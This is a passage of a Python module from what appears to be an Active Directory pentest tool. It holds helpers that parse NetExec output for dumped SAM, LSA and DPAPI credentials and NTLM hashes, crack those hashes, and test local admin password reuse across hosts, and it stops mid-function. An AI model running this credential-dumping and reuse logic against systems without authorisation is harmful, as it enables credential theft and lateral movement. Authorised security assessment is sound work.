"""Credential dump helpers for the CLI.

This module contains all credential and data extraction operations (dumps),
regardless of the protocol used (SMB, WinRM, Impacket, etc.).

Scope:
- Registry dumps (SAM/SECURITY/SYSTEM hives)
- LSA secrets extraction
- SAM database dumps
- DPAPI credential extraction
- LSASS memory dumps
- Hash extraction from dumped data

Module structure:
- `run_dump_*` functions: Build commands and orchestrate dump operations
- `execute_dump_*` functions: Execute commands and process output to extract credentials

All dump-related logic (command construction, execution, and output processing)
is centralized in this module for consistency and maintainability.
"""

from __future__ import annotations

from typing import Any
import os
import re

from rich.prompt import Confirm

from adscan_internal import (
    print_error,
    print_exception,
    print_info,
    print_info_table,
    print_info_debug,
    print_instruction,
    print_panel,
    print_success,
    print_warning,
    print_operation_header,
    telemetry,
)
from adscan_internal.rich_output import (
    ScanProgressTracker,
    confirm_operation,
)
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.text_utils import strip_ansi_codes
from adscan_internal.workspaces.subpaths import domain_relpath

_NXC_SMB_LINE_RE = re.compile(r"^\s*SMB\s+\S+\s+\d+\s+(?P<host>[A-Za-z0-9_.-]+)\s+")
_NXC_DUMPED_CREDENTIAL_TOKEN_RE = re.compile(r"(?P<token>[^\s\\]+\\[^\s:]+:[^\s]+)")
_NXC_DUMPED_UPN_CREDENTIAL_TOKEN_RE = re.compile(
    r"(?P<token>[^\s:@\\]+@[^\s:@\\]+:[^\s]+)"
)
_NXC_DUMPED_SAM_TOKEN_RE = re.compile(
    r"(?P<token>[^\s:]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:[^\s]*)"
)
_NXC_STATUS_TOKEN_RE = re.compile(r"\s\[(?:\+|-)\]\s")
_DEFAULT_DUMP_COMMAND_TIMEOUT_SECONDS = 300
_BULK_DUMP_COMMAND_TIMEOUT_SECONDS = 7200
_EMPTY_NTLM_HASH = "31d6cfe0d16ae931b73c59d7e0c089c0"
_SAM_REUSE_EXCLUDED_USERNAMES = {
    "guest",
    "invitado",
    "defaultaccount",
    "wdagutilityaccount",
    "defaultuser0",
}
_SAM_REUSE_EXCLUDED_RIDS = {"501", "503", "504"}
_SAM_REUSE_REASON_LABELS = {
    "empty_username": "Empty username",
    "machine_account": "Machine account",
    "disabled_builtin_account": "Disabled built-in account",
    "disabled_builtin_rid": "Disabled built-in RID",
    "empty_hash": "Empty NTLM hash",
    "invalid_hash": "Invalid NTLM hash",
    "not_reused_across_hosts": "Not reused across hosts",
}


def _ensure_pro_for_all_hosts_dump(shell: Any, *, dump_label: str) -> bool:
    """Validate policy for dump operations targeting all hosts."""
    _ = shell
    _ = dump_label
    return True


def _extract_dumped_credentials_with_hosts(
    output: str,
    *,
    excluded_substrings: set[str] | None = None,
) -> list[tuple[str, str | None]]:
    """Extract dumped credential tokens and best-effort source host from NetExec output."""
    if not output:
        return []

    excluded_lower = {value.lower() for value in (excluded_substrings or set())}
    current_host: str | None = None
    seen: set[str] = set()
    results: list[tuple[str, str | None]] = []

    for raw_line in output.splitlines():
        line = strip_ansi_codes(raw_line)
        if "(pwn3d!)" in line.lower() or _NXC_STATUS_TOKEN_RE.search(line):
            # Authentication success lines are not dumped credentials.
            continue
        host_match = _NXC_SMB_LINE_RE.match(line)
        if host_match:
            host_candidate = str(host_match.group("host") or "").strip()
            if host_candidate:
                current_host = host_candidate

        for pattern in (
            _NXC_DUMPED_CREDENTIAL_TOKEN_RE,
            _NXC_DUMPED_UPN_CREDENTIAL_TOKEN_RE,
            _NXC_DUMPED_SAM_TOKEN_RE,
        ):
            for match in pattern.finditer(line):
                token = match.group("token").strip().strip(",;\"'")
                if not token:
                    continue
                token_lower = token.lower()
                if excluded_lower and any(
                    excl in token_lower for excl in excluded_lower
                ):
                    continue
                dedupe_key = f"{token_lower}|{str(current_host or '').lower()}"
                if dedupe_key in seen:
                    continue
                seen.add(dedupe_key)
                results.append((token, current_host))

    return results


def _resolve_step_host(
    *,
    parsed_host: str | None,
    requested_host: str,
) -> str | None:
    """Resolve host to use for credential source step creation."""
    if parsed_host:
        return parsed_host
    requested_clean = str(requested_host or "").strip()
    if (
        requested_clean
        and requested_clean.lower() != "all"
        and not _is_hosts_file_target(requested_clean)
    ):
        return requested_clean
    return None


def _is_hosts_file_target(requested_host: str) -> bool:
    """Return True when requested host points to a targets file."""
    requested_clean = str(requested_host or "").strip()
    if not requested_clean:
        return False
    if requested_clean.lower() == "all":
        return False
    if not (requested_clean.endswith(".txt") or os.path.sep in requested_clean):
        return False
    return os.path.isfile(requested_clean)


def _extract_username_from_lsa_identity(identity: str) -> str:
    """Return normalized username from LSA identity (DOMAIN\\user or user@domain)."""
    identity_clean = str(identity or "").strip()
    if "\\" in identity_clean:
        return identity_clean.split("\\")[-1].strip()
    if "@" in identity_clean:
        return identity_clean.split("@", 1)[0].strip()
    return identity_clean


def _is_bulk_dump_target(requested_host: str) -> bool:
    """Return True when dump target represents multiple hosts."""
    requested_clean = str(requested_host or "").strip()
    return requested_clean.lower() == "all" or _is_hosts_file_target(requested_clean)


def _dump_target_token(requested_host: str) -> str:
    """Return safe token for dump output filenames."""
    requested_clean = str(requested_host or "").strip()
    if requested_clean.lower() == "all":
        return "all"
    if _is_hosts_file_target(requested_clean):
        requested_clean = os.path.splitext(os.path.basename(requested_clean))[0]
    token = re.sub(r"[^A-Za-z0-9_.-]+", "_", requested_clean).strip("_")
    return token or "target"


def _dump_output_path(
    *,
    domains_dir: str,
    domain: str,
    dump_kind: str,
    requested_host: str,
) -> str:
    """Build normalized dump output path for SAM/LSA/DPAPI logs."""
    if str(requested_host or "").strip().lower() == "all":
        filename = f"dump_all_{dump_kind}.txt"
    else:
        filename = f"dump_{_dump_target_token(requested_host)}_{dump_kind}.txt"
    return domain_relpath(domains_dir, domain, "smb", filename)


def _resolve_dump_command_timeout(requested_host: str) -> int:
    """Return command timeout based on dump scope."""
    if _is_bulk_dump_target(requested_host):
        return _BULK_DUMP_COMMAND_TIMEOUT_SECONDS
    return _DEFAULT_DUMP_COMMAND_TIMEOUT_SECONDS


def _record_bulk_finding(
    summary: dict[str, dict[str, Any]],
    *,
    host: str | None,
    username: str,
    is_hash: bool,
) -> None:
    """Aggregate credential findings per host for compact UX on bulk dumps."""
    host_key = str(host or "unknown host").strip() or "unknown host"
    bucket = summary.setdefault(
        host_key,
        {
            "hashes": 0,
            "passwords": 0,
            "users": set(),
        },
    )
    if is_hash:
        bucket["hashes"] += 1
    else:
        bucket["passwords"] += 1
    users = bucket.get("users")
    if isinstance(users, set):
        users.add(str(username or "").strip())


def _print_bulk_summary(*, dump_kind: str, summary: dict[str, dict[str, Any]]) -> None:
    """Render aggregated credential findings for bulk dump operations."""
    if not summary:
        return

    rows: list[dict[str, Any]] = []
    for host_name in sorted(summary.keys()):
        bucket = summary.get(host_name, {})
        users = bucket.get("users")
        users_count = len(users) if isinstance(users, set) else 0
        credentials_list: list[str] = []
        if isinstance(users, set):
            credentials_list = sorted(
                mark_sensitive(str(user), "user") for user in users if str(user).strip()
            )
        credentials_display = ", ".join(credentials_list) if credentials_list else "-"
        rows.append(
            {
                "Host": mark_sensitive(host_name, "hostname"),
                "Users": users_count,
                "Hashes": int(bucket.get("hashes", 0)),
                "Passwords": int(bucket.get("passwords", 0)),
                "Credentials": credentials_display,
            }
        )

    title = f"{dump_kind} Credential Summary by Host"
    print_info_table(
        rows, ["Host", "Users", "Hashes", "Passwords", "Credentials"], title=title
    )


def _record_bulk_credential(
    bucket: dict[tuple[str, str, bool], dict[str, Any]],
    *,
    username: str,
    credential: str,
    is_hash: bool,
    host: str | None,
) -> None:
    """Aggregate credentials for bulk dumps to avoid duplicate verification calls."""
    key = (str(username or "").strip().lower(), str(credential or "").strip(), is_hash)
    entry = bucket.setdefault(
        key,
        {
            "username": str(username or "").strip(),
            "credential": str(credential or "").strip(),
            "is_hash": is_hash,
            "hosts": set(),
        },
    )
    hosts = entry.get("hosts")
    if isinstance(hosts, set):
        hosts.add(str(host).strip() if host else "")


def _persist_bulk_credentials(
    shell: Any,
    *,
    domain: str,
    dump_kind: str,
    auth_username: str | None,
    credentials: dict[tuple[str, str, bool], dict[str, Any]],
    include_machine_accounts: bool = False,
) -> None:
    """Persist aggregated bulk credentials using one add_credential call per credential."""
    for entry in credentials.values():
        username = str(entry.get("username") or "").strip()
        credential = str(entry.get("credential") or "").strip()
        if not username or not credential:
            continue
        hosts = entry.get("hosts")
        host_values = (
            sorted(str(host).strip() for host in hosts if str(host).strip())
            if isinstance(hosts, set)
            else []
        )
        if host_values:
            source_steps: list[object] = []
            for host_value in host_values:
                source_steps.extend(
                    _build_dump_source_steps(
                        domain=domain,
                        dump_kind=dump_kind,
                        host=host_value,
                        auth_username=auth_username,
                        credential_username=username,
                    )
                )
        else:
            source_steps = _build_dump_source_steps(
                domain=domain,
                dump_kind=dump_kind,
                host=None,
                auth_username=auth_username,
                credential_username=username,
            )
        add_kwargs: dict[str, Any] = {
            "prompt_for_user_privs_after": False,
            "ui_silent": True,
            "ensure_fresh_kerberos_ticket": False,
        }
        if include_machine_accounts and username.endswith("$"):
            add_kwargs["verify_credential"] = False
            add_kwargs["skip_hash_cracking"] = True
        if source_steps:
            add_kwargs["source_steps"] = source_steps
        shell.add_credential(
            domain,
            username,
            credential,
            **add_kwargs,
        )


def _expand_bulk_local_credentials(
    credentials: dict[tuple[str, str, bool], dict[str, Any]],
) -> list[tuple[str, str, str, str]]:
    """Expand aggregated bulk credentials into host-scoped local credential tuples."""
    expanded: list[tuple[str, str, str, str]] = []
    seen: set[tuple[str, str, str, str]] = set()
    for entry in credentials.values():
        username = str(entry.get("username") or "").strip()
        credential = str(entry.get("credential") or "").strip()
        if not username or not credential:
            continue
        hosts = entry.get("hosts")
        host_values = (
            sorted(str(host).strip() for host in hosts if str(host).strip())
            if isinstance(hosts, set)
            else []
        )
        for host in host_values:
            dedupe_key = (host.lower(), "smb", username.lower(), credential)
            if dedupe_key in seen:
                continue
            seen.add(dedupe_key)
            expanded.append((host, "smb", username, credential))
    return expanded


def _persist_bulk_sam_local_credentials(
    shell: Any,
    *,
    domain: str,
    credentials: dict[tuple[str, str, bool], dict[str, Any]],
) -> None:
    """Persist bulk SAM credentials as local host-scoped credentials.

    SAM extraction yields local accounts. In bulk mode we must never route these
    through domain credential verification. Credentials are persisted without
    local verification and without post-add local-reuse prompts because reuse is
    handled explicitly in the SAM reuse validation phase.
    """
    expanded = _expand_bulk_local_credentials(credentials)
    if not expanded:
        return

    add_local_batch = getattr(shell, "add_local_credentials_batch", None)
    if callable(add_local_batch):
        try:
            add_local_batch(
                domain=domain,
                credentials=expanded,
                skip_hash_cracking=False,
                verify_local_credential=False,
                prompt_local_reuse_after=False,
                ui_silent=True,
            )
            return
        except TypeError:
            # Backward compatibility for shells exposing legacy signatures.
            pass

    for host, service, username, credential in expanded:
        shell.add_credential(
            domain,
            username,
            credential,
            host=host,
            service=service,
            prompt_for_user_privs_after=False,
            verify_local_credential=False,
            prompt_local_reuse_after=False,
            ui_silent=True,
            ensure_fresh_kerberos_ticket=False,
        )


def _run_optional_local_admin_reuse_validation(
    shell: Any,
    *,
    domain: str,
    candidates: list[dict[str, Any]],
    total_discovered: int = 0,
    excluded_by_reason: dict[str, int] | None = None,
) -> None:
    """Run optional local credential reuse validation for SAM bulk dump candidates.

    This runs active validation (`--local-auth`) only for local accounts where the
    same credential appears on multiple hosts. Confirmed admin reuse (Pwn3d) will
    record LocalAdminPassReuse attack-step edges.
    """
    from adscan_internal.cli.smb import run_local_cred_reuse

    marked_domain = mark_sensitive(domain, "domain")
    excluded_by_reason = excluded_by_reason or {}
    candidate_count = 0
    for item in candidates:
        if not isinstance(item, dict):
            continue
        username = str(item.get("username") or "").strip()
        if not username:
            continue
        candidate_count += 1

    total_excluded = int(sum(excluded_by_reason.values()))
    reasons_text = ", ".join(
        f"{_SAM_REUSE_REASON_LABELS.get(reason, reason)}={count}"
        for reason, count in sorted(excluded_by_reason.items())
    )
    if not reasons_text:
        reasons_text = "none"

    print_panel(
        "\n".join(
            [
                "[bold]Local Credential Reuse Validation[/bold]",
                f"Domain: {marked_domain}",
                "",
                "ADscan identified only reusable local credential candidates",
                "(same local credential observed across multiple hosts).",
                "Validation is optional and records paths only when admin access",
                "is confirmed (Pwn3d).",
                "",
                f"Local accounts discovered: {total_discovered}",
                f"Candidates selected: {candidate_count}",
                f"Excluded: {total_excluded}",
                f"Exclusion reasons: {reasons_text}",
            ]
        ),
        title="[bold magenta]SAM Reuse Validation[/bold magenta]",
        border_style="magenta",
        expand=False,
    )
    if candidate_count == 0:
        print_info(
            f"Skipping local credential reuse validation in {marked_domain}: no reusable local credentials were detected."
        )
        return

    if not confirm_operation(
        operation_name="Local Credential Reuse Validation",
        description=(
            "Validates only reusable local credentials and records LocalAdminPassReuse "
            "steps when admin access is confirmed."
        ),
        context={
            "Domain": marked_domain,
            "Reusable Candidates": str(candidate_count),
            "Discovery Scope": "SAM dump (all hosts)",
            "Validation Method": "NetExec local-auth (Pwn3d required)",
        },
        default=True,
        icon="🔁",
        show_panel=True,
    ):
        print_info(
            f"Skipped local credential reuse validation for {marked_domain} by user choice."
        )
        return
    resolved_candidates = _resolve_reuse_candidate_credentials(
        shell=shell,
        candidates=candidates,
    )
    resolved_rows = _build_resolved_reuse_candidate_rows(
        shell=shell,
        candidates=resolved_candidates,
    )
    if resolved_rows:
        print_info_table(
            resolved_rows,
            ["User", "RID", "Hosts", "Credential Type", "Credential", "Method"],
            title="Local Credential Reuse Candidates",
        )

    by_user: dict[str, int] = {}
    for item in resolved_candidates:
        username = str(item.get("username") or "").strip().lower()
        if not username:
            continue
        by_user[username] = int(by_user.get(username, 0)) + 1
    repeated_users = sorted(
        ((user, count) for user, count in by_user.items() if count > 1),
        key=lambda entry: entry[0],
    )
    if repeated_users:
        repeated_text = ", ".join(
            f"{mark_sensitive(user, 'user')} ({count} variants)"
            for user, count in repeated_users
        )
        print_info(
            "Detected multiple credential variants for the same local account; "
            f"each variant is validated separately: {repeated_text}"
        )

    print_info(
        f"Running local credential reuse validation for {len(resolved_rows)} candidate(s) in {marked_domain}."
    )
    validation_results: list[dict[str, Any]] = []
    for item in sorted(
        resolved_candidates, key=lambda value: str(value.get("username") or "").lower()
    ):
        user_clean = str(item.get("username") or "").strip()
        cred_clean = str(item.get("credential") or "").strip()
        rid_clean = str(item.get("rid") or "").strip()
        if not user_clean or not cred_clean:
            continue
        marked_user = mark_sensitive(user_clean, "user")
        print_info(
            f"Validating local credential reuse for {marked_user} (RID {rid_clean}) across enabled hosts."
        )
        try:
            result = run_local_cred_reuse(
                shell,
                domain=domain,
                username=user_clean,
                credential=cred_clean,
                prompt_dump_after_reuse=False,
            )
            validation_results.append(
                {
                    "username": user_clean,
                    "rid": rid_clean or "-",
                    "source_hosts": int(item.get("source_hosts", 0) or 0),
                    "result": result if isinstance(result, dict) else {},
                }
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning(
                f"Local admin reuse validation failed for {marked_user}; continuing."
            )
            validation_results.append(
                {
                    "username": user_clean,
                    "rid": rid_clean or "-",
                    "source_hosts": int(item.get("source_hosts", 0) or 0),
                    "result": {
                        "status": "error",
                        "error": str(exc),
                        "reuse_targets": [],
                        "created_edges": 0,
                    },
                }
            )

    _print_local_reuse_validation_summary(
        domain=domain,
        results=validation_results,
        title="Local Reuse Validation Summary",
    )


def _supports_local_reuse_execution(shell: Any) -> bool:
    """Return True when shell can execute local credential reuse validation."""
    required = (
        "is_hash",
        "build_auth_nxc",
        "netexec_path",
        "execute_local_cred_reuse",
    )
    for attr in required:
        value = getattr(shell, attr, None)
        if attr == "netexec_path":
            if not value:
                return False
            continue
        if not callable(value):
            return False
    return True


def _select_reuse_candidates_with_checkbox(
    shell: Any,
    *,
    candidates: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    """Allow operator to choose reuse-validation candidates via checkbox."""
    if not candidates:
        return []

    options: list[str] = []
    option_to_candidate: dict[str, dict[str, Any]] = {}
    for idx, item in enumerate(candidates, start=1):
        username = str(item.get("username") or "").strip()
        rid = str(item.get("rid") or "-").strip() or "-"
        source_hosts = int(item.get("source_hosts", 0) or 0)
        credential = str(item.get("credential") or "").strip()
        if not username or not credential:
            continue
        marked_user = mark_sensitive(username, "user")
        label = f"{idx}. {marked_user} (RID {rid}, seen on {source_hosts} host(s))"
        options.append(label)
        option_to_candidate[label] = item

    if not options:
        return []

    checkbox = getattr(shell, "_questionary_checkbox", None)
    if callable(checkbox):
        selected_labels = checkbox(
            "Select local credentials to validate for reuse:",
            options,
        )
        if selected_labels is None:
            return []
        selected = [
            option_to_candidate[label]
            for label in selected_labels
            if label in option_to_candidate
        ]
        return selected

    # Fallback when interactive checkbox is unavailable: keep all candidates.
    return list(option_to_candidate.values())


def _run_single_host_local_admin_reuse_validation(
    shell: Any,
    *,
    domain: str,
    source_host: str,
    candidates: list[dict[str, Any]],
) -> None:
    """Run optional local reuse validation for SAM dump from a single host."""
    from adscan_internal.cli.smb import run_local_cred_reuse

    if not candidates:
        return

    if not _supports_local_reuse_execution(shell):
        print_info_debug(
            "[sam_reuse] Skipping single-host local reuse validation: shell "
            "does not expose required NetExec reuse helpers."
        )
        return

    marked_domain = mark_sensitive(domain, "domain")
    marked_source_host = mark_sensitive(source_host, "hostname")
    print_panel(
        "\n".join(
            [
                "[bold]Single-Host SAM Reuse Validation[/bold]",
                f"Domain: {marked_domain}",
                f"Source Host: {marked_source_host}",
                "",
                "Select which extracted local credentials should be tested",
                "across all enabled hosts using NetExec local-auth.",
                "ADscan records LocalAdminPassReuse only on confirmed Pwn3d hits.",
            ]
        ),
        title="[bold magenta]SAM Reuse Validation[/bold magenta]",
        border_style="magenta",
        expand=False,
    )

    selected_candidates = _select_reuse_candidates_with_checkbox(
        shell,
        candidates=candidates,
    )
    if not selected_candidates:
        print_info(
            f"Skipped local credential reuse validation for {marked_domain}: no candidate selected."
        )
        return

    selected_rows: list[dict[str, Any]] = []
    for item in selected_candidates:
        username = str(item.get("username") or "").strip()
        rid = str(item.get("rid") or "-").strip() or "-"
        source_hosts = int(item.get("source_hosts", 0) or 0)
        if not username:
            continue
        selected_rows.append(
            {
                "User": mark_sensitive(username, "user"),
                "RID": rid,
                "Hosts": source_hosts,
                "Method": "Local-auth reuse validation",
            }
        )

    if not selected_rows:
        print_info(
            f"Skipped local credential reuse validation for {marked_domain}: no candidate selected."
        )
        return

    if not confirm_operation(
        operation_name="Local Credential Reuse Validation",
        description=(
            "Runs NetExec local-auth reuse validation on selected credentials and "
            "records LocalAdminPassReuse steps only for confirmed admin hits."
        ),
        context={
            "Domain": marked_domain,
            "Source Host": marked_source_host,
            "Selected Candidates": str(len(selected_rows)),
            "Validation Method": "NetExec local-auth (Pwn3d required)",
        },
        default=True,
        icon="🔁",
        show_panel=True,
    ):
        print_info(
            f"Skipped local credential reuse validation for {marked_domain} by user choice."
        )
        return

    resolved_candidates = _resolve_reuse_candidate_credentials(
        shell=shell,
        candidates=selected_candidates,
    )
    resolved_rows = _build_resolved_reuse_candidate_rows(
        shell=shell,
        candidates=resolved_candidates,
    )
    if resolved_rows:
        print_info_table(
            resolved_rows,
            ["User", "RID", "Hosts", "Credential Type", "Credential", "Method"],
            title="Selected Local Reuse Candidates",
        )

    validation_results: list[dict[str, Any]] = []
    for item in sorted(
        resolved_candidates, key=lambda value: str(value.get("username") or "").lower()
    ):
        user_clean = str(item.get("username") or "").strip()
        cred_clean = str(item.get("credential") or "").strip()
        rid_clean = str(item.get("rid") or "").strip()
        if not user_clean or not cred_clean:
            continue
        marked_user = mark_sensitive(user_clean, "user")
        print_info(
            f"Validating local credential reuse for {marked_user} (RID {rid_clean}) across enabled hosts."
        )
        try:
            result = run_local_cred_reuse(
                shell,
                domain=domain,
                username=user_clean,
                credential=cred_clean,
                prompt_dump_after_reuse=False,
            )
            validation_results.append(
                {
                    "username": user_clean,
                    "rid": rid_clean or "-",
                    "source_hosts": int(item.get("source_hosts", 0) or 0),
                    "result": result if isinstance(result, dict) else {},
                }
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning(
                f"Local admin reuse validation failed for {marked_user}; continuing."
            )
            validation_results.append(
                {
                    "username": user_clean,
                    "rid": rid_clean or "-",
                    "source_hosts": int(item.get("source_hosts", 0) or 0),
                    "result": {
                        "status": "error",
                        "error": str(exc),
                        "reuse_targets": [],
                        "created_edges": 0,
                    },
                }
            )

    _print_local_reuse_validation_summary(
        domain=domain,
        results=validation_results,
        title="Single-Host Reuse Validation Summary",
    )


def _is_hash_credential(shell: Any, credential: str) -> bool:
    """Return True when credential value looks like an NTLM hash."""
    value = str(credential or "").strip()
    checker = getattr(shell, "is_hash", None)
    if callable(checker):
        try:
            return bool(checker(value))
        except Exception:  # noqa: BLE001
            return bool(re.fullmatch(r"[0-9a-fA-F]{32}", value))
    return bool(re.fullmatch(r"[0-9a-fA-F]{32}", value))


def _build_resolved_reuse_candidate_rows(
    *,
    shell: Any,
    candidates: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    """Build candidate rows including resolved credential material."""
    rows_with_key: list[tuple[tuple[str, str, str], dict[str, Any]]] = []
    for item in candidates:
        if not isinstance(item, dict):
            continue
        username = str(item.get("username") or "").strip()
        rid = str(item.get("rid") or "-").strip() or "-"
        source_hosts = int(item.get("source_hosts", 0) or 0)
        credential = str(item.get("credential") or "").strip()
        if not username or not credential:
            continue
        is_hash = _is_hash_credential(shell, credential)
        was_cracked = bool(item.get("credential_was_cracked"))
        if is_hash:
            credential_type = "Hash"
        elif was_cracked:
            credential_type = "Password (cracked)"
        else:
            credential_type = "Password"

        row = {
            "User": mark_sensitive(username, "user"),
            "RID": rid,
            "Hosts": source_hosts,
            "Credential Type": credential_type,
            "Credential": mark_sensitive(credential, "password"),
            "Method": "Local-auth reuse validation",
        }
        rows_with_key.append(
            (
                (
                    username.lower(),
                    rid,
                    credential.lower(),
                ),
                row,
            )
        )

    return [row for _, row in sorted(rows_with_key, key=lambda item: item[0])]


def _resolve_reuse_candidate_credentials(
    *,
    shell: Any,
    candidates: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    """Resolve candidate credentials before reuse validation (batch hash cracking)."""
    if not candidates:
        return []

    from adscan_internal.cli.creds import resolve_credential_pairs_for_batch

    resolved: list[dict[str, Any]] = []
    raw_pairs: list[tuple[str, str]] = []
    filtered_candidates: list[dict[str, Any]] = []
    for item in candidates:
        if not isinstance(item, dict):
            continue
        current = dict(item)
        username = str(current.get("username") or "").strip()
        credential = str(current.get("credential") or "").strip()
        if not username or not credential:
            continue
        filtered_candidates.append(current)
        raw_pairs.append((username, credential))

    resolved_pairs = resolve_credential_pairs_for_batch(
        shell,
        credentials=raw_pairs,
        skip_hash_cracking=False,
        skip_machine_accounts_cracking=True,
    )

    cracked_rows: list[dict[str, Any]] = []
    for current, (_resolved_user, resolved_credential) in zip(
        filtered_candidates, resolved_pairs
    ):
        original_credential = str(current.get("credential") or "").strip()
        was_cracked = original_credential != resolved_credential
        if was_cracked:
            username_clean = str(current.get("username") or "").strip()
            marked_user = mark_sensitive(username_clean, "user")
            print_info_debug(
                f"[sam_reuse] Using cracked password for reuse validation: {marked_user}"
            )
            cracked_rows.append(
                {
                    "User": marked_user,
                    "Original Hash": mark_sensitive(original_credential, "password"),
                    "Cracked Password": mark_sensitive(resolved_credential, "password"),
                }
            )
        current["original_credential"] = original_credential
        current["credential_was_cracked"] = was_cracked
        current["credential"] = resolved_credential
        resolved.append(current)

    if cracked_rows:
        print_info_table(
            cracked_rows,
            ["User", "Original Hash", "Cracked Password"],
            title="Cracked Local Reuse Credentials",
        )
    return resolved


def _summarize_reuse_targets_for_table(
    targets: list[dict[str, str]],
    *,
    max_hosts: int = 4,
) -> str:
    """Return compact host summary for reuse validation table rows."""
    host_values: list[str] = []
    seen: set[str] = set()
    for item in targets:
        if not isinstance(item, dict):
            continue
        host = str(item.get("hostname") or item.get("target") or "").strip()
        if not host:
            continue
        key = host.lower()
        if key in seen:
            continue
        seen.add(key)
        host_values.append(host)

    if not host_values:
        return "-"
    visible = host_values[:max_hosts]
    visible_marked = [mark_sensitive(value, "hostname") for value in visible]
    if len(host_values) > max_hosts:
        remaining = len(host_values) - max_hosts
        return f"{', '.join(visible_marked)} (+{remaining} more)"
    return ", ".join(visible_marked)


def _print_local_reuse_validation_summary(
    *,
    domain: str,
    results: list[dict[str, Any]],
    title: str,
) -> None:
    """Render final premium summary for local credential reuse validation batch."""
    if not results:
        return

    status_weight = {"reused": 0, "no_reuse": 1, "error": 2}
    rows_with_key: list[tuple[tuple[int, str], dict[str, Any]]] = []
    reused_count = 0
    no_reuse_count = 0
    error_count = 0
    total_edges = 0

    for item in results:
        if not isinstance(item, dict):
            continue
        username = str(item.get("username") or "").strip()
        rid = str(item.get("rid") or "-").strip() or "-"
        source_hosts = int(item.get("source_hosts", 0) or 0)
        result_data = item.get("result")
        if not isinstance(result_data, dict):
            result_data = {}
        credential_type_raw = (
            str(result_data.get("credential_type") or "").strip().lower()
        )
        if credential_type_raw == "hash":
            credential_type = "Hash"
        elif credential_type_raw == "password":
            credential_type = "Password"
        else:
            credential_type = "Unknown"
        raw_status = str(result_data.get("status") or "").strip().lower()
        if raw_status not in {"reused", "no_reuse", "error"}:
            raw_status = "reused" if result_data.get("reuse_targets") else "no_reuse"
        if raw_status == "reused":
            reused_count += 1
        elif raw_status == "error":
            error_count += 1
        else:
            no_reuse_count += 1

        targets = result_data.get("reuse_targets")
        targets_list = targets if isinstance(targets, list) else []
        host_count = len(targets_list)
        hosts_label = _summarize_reuse_targets_for_table(targets_list)
        created_edges = int(result_data.get("created_edges", 0) or 0)
        total_edges += created_edges

        if raw_status == "reused":
            status_label = "Reused"
        elif raw_status == "error":
            status_label = "Error"
        else:
            status_label = "Not reused"

        notes = "-"
        outcome_counts_raw = result_data.get("outcome_counts")
        outcome_counts = (
            outcome_counts_raw if isinstance(outcome_counts_raw, dict) else {}
        )
        filtered_outcomes = {
            str(code): int(count)
            for code, count in outcome_counts.items()
            if str(code).upper() != "PWN3D"
        }
        filtered_summary = ""
        if filtered_outcomes:
            ordered_outcomes = sorted(
                filtered_outcomes.items(),
                key=lambda item: (-int(item[1]), str(item[0])),
            )
            filtered_summary = ", ".join(
                f"{code}={count}" for code, count in ordered_outcomes[:3]
            )
            if len(ordered_outcomes) > 3:
                filtered_summary += f", +{len(ordered_outcomes) - 3} more"
        if raw_status == "error":
            error_text = str(result_data.get("error") or "").strip()
            notes = error_text[:90] if error_text else "Validation error"
        elif raw_status == "reused" and created_edges > 0:
            notes = f"{created_edges} LocalAdminPassReuse step(s)"
        if filtered_summary:
            if notes == "-":
                notes = f"Filtered: {filtered_summary}"
            else:
                notes = f"{notes} | Filtered: {filtered_summary}"

        rows_with_key.append(
            (
                (status_weight.get(raw_status, 9), username.lower()),
                {
                    "Credential": mark_sensitive(username or "-", "user"),
                    "Credential Type": credential_type,
                    "RID": rid,
                    "Source Hosts": source_hosts,
                    "Status": status_label,
                    "Reused Hosts": host_count,
                    "Targets": hosts_label,
                    "Notes": notes,
                },
            )
        )

    if not rows_with_key:
        return

    rows = [row for _, row in sorted(rows_with_key, key=lambda item: item[0])]
    print_info_table(
        rows,
        [
            "Credential",
            "Credential Type",
            "RID",
            "Source Hosts",
            "Status",
            "Reused Hosts",
            "Targets",
            "Notes",
        ],
        title=title,
    )

    marked_domain = mark_sensitive(domain, "domain")
    print_panel(
        "\n".join(
            [
                "[bold]Local Credential Reuse Validation Completed[/bold]",
                f"Domain: {marked_domain}",
                "",
                f"Credentials validated: {len(rows)}",
                f"Reused credentials: {reused_count}",
                f"Not reused: {no_reuse_count}",
                f"Errors: {error_count}",
                f"LocalAdminPassReuse steps created: {total_edges}",
            ]
        ),
        title="[bold magenta]Reuse Validation Result[/bold magenta]",
        border_style="magenta",
        expand=False,
    )


def _normalize_sam_rid(value: str | None) -> str:
    """Return a normalized RID string from SAM dump output."""
    return str(value or "").strip()


def _should_include_for_reuse_validation(
    *,
    username: str,
    rid: str,
    nt_hash: str,
) -> tuple[bool, str]:
    """Return inclusion decision and reason for local credential reuse validation."""
    username_clean = str(username or "").strip().lower()
    rid_clean = _normalize_sam_rid(rid)
    nt_hash_clean = str(nt_hash or "").strip().lower()
    if not username_clean:
        return False, "empty_username"
    if username_clean.endswith("$"):
        return False, "machine_account"
    # Well-known local accounts that are disabled/non-operational by default.
    if username_clean in _SAM_REUSE_EXCLUDED_USERNAMES:
        return False, "disabled_builtin_account"
    if rid_clean in _SAM_REUSE_EXCLUDED_RIDS:
        return False, "disabled_builtin_rid"
    if nt_hash_clean == _EMPTY_NTLM_HASH:
        return False, "empty_hash"
    if not re.fullmatch(r"[a-f0-9]{32}", nt_hash_clean):
        return False, "invalid_hash"
    return True, "eligible"


def _should_include_plaintext_sam_account(
    *,
    username: str,
) -> tuple[bool, str]:
    """Return inclusion decision for plaintext SAM account records."""
    username_clean = str(username or "").strip().lower()
    if not username_clean:
        return False, "empty_username"
    if username_clean.endswith("$"):
        return False, "machine_account"
    if username_clean in _SAM_REUSE_EXCLUDED_USERNAMES:
        return False, "disabled_builtin_account"
    return True, "eligible"


def _build_dump_source_steps(
    *,
    domain: str,
    dump_kind: str,
    host: str | None,
    auth_username: str | None = None,
    credential_username: str | None = None,
) -> list[object]:
    """Build credential provenance steps for dump-derived credentials."""
    from adscan_internal.principal_utils import normalize_machine_account
    from adscan_internal.services.attack_graph_service import (
        CredentialSourceStep,
        resolve_entry_label_for_auth,
    )

    dump_key = str(dump_kind or "").strip().upper()
    # DumpSAM provenance is intentionally disabled for now because SAM output
